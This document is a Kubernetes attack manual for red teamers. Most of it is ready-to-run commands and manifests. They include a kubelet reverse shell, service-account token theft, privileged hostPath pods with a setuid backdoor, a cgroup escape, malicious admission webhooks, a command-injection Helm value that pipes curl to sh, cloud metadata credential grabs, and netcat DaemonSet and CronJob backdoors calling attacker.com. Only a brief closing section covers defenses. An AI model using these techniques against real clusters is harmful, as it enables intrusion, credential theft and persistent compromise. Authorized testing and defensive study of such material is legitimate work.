# Offensive Security RCE Field Manual — Part 3  
## Kubernetes RCE (2025 Edition)  
*A comprehensive offensive security module covering Kubernetes attack surfaces, API server exploitation, kubelet abuse, container runtime escapes, admission controller hijacking, GitOps supply-chain compromise, lateral movement, persistence, and real 2025 attacker TTPs.*

---

# LEGAL DISCLAIMER
This document is for **authorized penetration testing, red teaming, threat research, and defensive training only**.  
Do **NOT** use this material on systems you do not own or lack explicit written permission to test.  
Unauthorized access is illegal.  
All content is provided for educational and defensive research purposes.

---

# Table of Contents

1. [Introduction](#introduction)  
2. [Initial Access & Reconnaissance](#initial-access--reconnaissance)  
3. [Kubelet RCE Exploitation](#kubelet-rce-exploitation)  
4. [Kubernetes API Server Abuse](#kubernetes-api-server-abuse)  
5. [Container Escape Vectors](#container-escape-vectors)  
6. [Admission Controller Hijacking](#admission-controller-hijacking)  
7. [CRI / Runtime Exploitation](#cri--runtime-exploitation)  
8. [GitOps Supply Chain Attacks (ArgoCD, FluxCD)](#gitops-supply-chain-attacks)  
9. [Cloud-Specific Kubernetes Attacks (EKS, AKS, GKE)](#cloud-specific-kubernetes-attacks)  
10. [Lateral Movement & Persistence](#lateral-movement--persistence)  
11. [Defensive Strategies & Detection](#defensive-strategies--detection)  
12. [Legal Notice](#legal-notice)

---

# Introduction

Kubernetes has become the backbone of modern cloud-native workloads.  
In 2025, adversaries exploit it not as an “application platform” but as a **distributed command execution platform**.

Why Kubernetes is a prime RCE target:

- It runs critical production workloads  
- It exposes multiple high-privilege APIs  
- It relies heavily on identity (RBAC, service accounts)  
- It uses container runtimes which can be escaped  
- It integrates with cloud providers (IAM, metadata)  
- It supports GitOps automation (supply-chain exposure)  

Modern threat actors weaponize Kubernetes for:

- rapid lateral movement  
- persistent backdoor workloads  
- supply chain injection  
- data exfiltration and encryption  
- cloud-provider privilege escalation  

This module documents **advanced offensive techniques** used in real intrusions across 2024–2025.

---

# Initial Access & Reconnaissance

Attackers begin by discovering:

- exposed Kubernetes API servers  
- accessible kubelets  
- workloads with weak security contexts  
- stolen service account tokens  
- misconfigured ingress controllers  
- cloud metadata access paths  

---

## Tools & Techniques for Initial Enumeration

### Network Scanning & Service Discovery

```bash
# Masscan for large-scale port discovery
masscan -p1-65535 10.0.0.0/8 --rate=100000

# Nmap Kubernetes scripts
nmap -sV -sC -p- --script=kube* target-ip
```

### Kubernetes-Specific Scanners

```bash
# Kube-Hunter (quick remote scanning)
kube-hunter --remote target-ip --quick

# Kubestrike (API server discovery)
kubestrike scan --cidr 10.0.0.0/16
```

### Manual API Server Discovery

```bash
https://kubernetes.default.svc.cluster.local
https://MASTER_IP:6443

kubectl get nodes --show-labels
kubectl auth can-i --list
kubectl get secrets --all-namespaces
```

---

## Burp Suite Techniques

- Intercept internal API traffic  
- Fuzz workload APIs  
- SSRF probing toward internal k8s services  
- Manipulate admission webhook configurations  
- Test reverse proxies or ingress for misrouting  

---

# Kubelet RCE Exploitation

The kubelet exposes dangerous APIs:

- Read-only port: 10255  
- Full privileged port: 10250  

If 10250 is unauthenticated (still common in 2025), it is **direct RCE**.

---

## Step 1 — Identify Exposed Kubelets

```bash
nmap -p10250,10255 --script=kubelet-* 10.0.0.0/24

curl -k https://10.0.0.100:10250/pods
curl -k https://10.0.0.100:10255/pods
```

---

## Step 2 — Enumerate Running Pods

```bash
curl -sk https://10.0.0.100:10250/pods | jq '.items[].metadata.name'

# Identify privileged pods
curl -sk https://10.0.0.100:10250/pods | \
jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'
```

---

## Step 3 — Execute Commands via Kubelet API

### Direct RCE

```bash
curl -sk -XPOST "https://10.0.0.100:10250/exec/default/app/nginx" \
  -d "cmd=id&input=1&output=1&tty=1"
```

### Reverse Shell Payload

```bash
curl -sk -XPOST \
  "https://10.0.0.100:10250/exec/default/victim-pod/app" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.0.50/4444 0>&1'"
```

---

## Step 4 — Automated Tooling

```bash
kubeletctl scan -t 10.0.0.100
kubeletctl exec "id" -p victim-pod -c app -n default
```

Metasploit:

```
auxiliary/scanner/kubernetes/kubelet_enum
exploit/linux/kubernetes/kubelet_exec
```

---

## Bypassing Security Controls

### Network Policy Evasion

- Deploy attacker pod on the same node  
- Bypass segmentation using host networking  
- Abuse kube-proxy misconfigs

### Authentication Bypass

- Anonymous auth enabled  
- Stolen service account tokens  
- Privileged pod creation → host escape  

---

# Kubernetes API Server Abuse

API server compromise = total control.

---

## Token Theft & Privilege Escalation

### Extract tokens from service accounts

```bash
find /var/run/secrets/kubernetes.io/serviceaccount -name token -exec cat {} \;

env | grep -i token
env | grep -i secret
```

### Use token to interact with cluster

```bash
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/pods
```

---

## RBAC Exploitation

### Enumerate Permissions

```bash
kubectl auth can-i --list
kubectl get roles,clusterroles --all-namespaces
```

### Privilege Escalation via RoleBinding

```bash
kubectl create rolebinding attacker-admin \
  --clusterrole=admin \
  --serviceaccount=default:attacker-sa
```

---

## High-Value Attack Chain

1. Compromise a pod  
2. Extract service account token  
3. Enumerate RBAC  
4. Deploy privileged pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
    - name: attacker
      image: alpine
      command: ["/bin/sh"]
      args: ["-c", "sleep infinity"]
      securityContext:
        privileged: true
      volumeMounts:
      - name: host-root
        mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
```

---

# Container Escape Vectors

These escapes remain widely exploited in 2025.

---

## Docker Socket Escape

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
```

Full host control through docker socket.

---

## HostPath Escape

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-mount-attacker
spec:
  containers:
  - name: attacker
    image: alpine
    args: ["/bin/sh", "-c", "cp /bin/bash /host/tmp/bd; chmod +s /host/tmp/bd"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

---

## Privileged Pods

```bash
cat /proc/self/status | grep Cap

# Load malicious kernel module
insmod reverse_shell.ko
```

---

## Runtime Exploitation Tools

```bash
./cdk run --full
deepce.sh --exploits
amicontained --output json
```

---

# Admission Controller Hijacking

Attacker becomes “gatekeeper” of all cluster workloads.

---

## Malicious ValidatingWebhookConfiguration

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: malicious-validation
webhooks:
- name: webhook.attacker.com
  clientConfig:
    url: "https://attacker.com/validate"
```

---

## Mutating Webhook: Backdoor Injection

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: backdoor-injector
webhooks:
- name: inject.attacker.com
  clientConfig:
    url: "https://attacker.com/mutate"
```

All new pods become compromised.

---

# CRI / Runtime Exploitation

---

## Containerd Exploitation

```bash
ctr --address /run/containerd/containerd.sock run \
 --mount type=bind,src=/,dst=/host,options=rbind \
 alpine:latest /bin/sh
```

---

## runc Escape

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
echo '+c' > /tmp/cgrp/release_agent
```

---

# GitOps Supply Chain Attacks

GitOps attacks have exploded in 2025.

---

## ArgoCD Template Injection

```yaml
helm:
  parameters:
    - name: image.tag
      value: "latest; curl attacker|sh"
```

---

## FluxCD Image Update Exploit

```yaml
apiVersion: image.toolkit.fluxcd.io/v1beta2
kind: ImageRepository
spec:
  image: attacker/malicious
```

---

# Cloud-Specific Kubernetes Attacks

---

# EKS Exploitation

### IAM Role via Metadata

```bash
curl 169.254.169.254/latest/meta-data/iam/security-credentials/
```

### OIDC Provider Abuse

```bash
aws iam update-open-id-connect-provider ...
```

---

# GKE Workload Identity Attack

```bash
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/.../token
```

---

# AKS Managed Identity Attack

```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token"
```

---

# Lateral Movement & Persistence

---

## DaemonSet Backdoor (Node-Level Persistence)

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-backdoor
spec:
  template:
    spec:
      containers:
      - name: backdoor
        image: alpine
        command: ["/bin/sh","-c","nc -l -p 4444 -e /bin/sh"]
        privileged: true
```

---

## CronJob Persistence

```yaml
apiVersion: batch/v1
kind: CronJob
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: rshell
            image: alpine
            command: ["sh","-c","nc attacker.com 4444 -e sh"]
```

---

# Defensive Strategies & Detection

---

## Pod Security Standards

```yaml
privileged: false  
allowPrivilegeEscalation: false  
requiredDropCapabilities: [ "ALL" ]
```

---

## Falco Rules (RCE Detection)

```yaml
- rule: PrivilegedContainer
  condition: container.privileged = true
```

---

## Incident Response

```bash
kubectl cordon compromised-node
kubectl drain compromised-node --ignore-daemonsets
```

---

# Legal Notice

This guide is intended strictly for **defensive, research, and authorized offensive testing**.  
Any unauthorized exploitation of Kubernetes systems is illegal.

---

# END OF PART 3
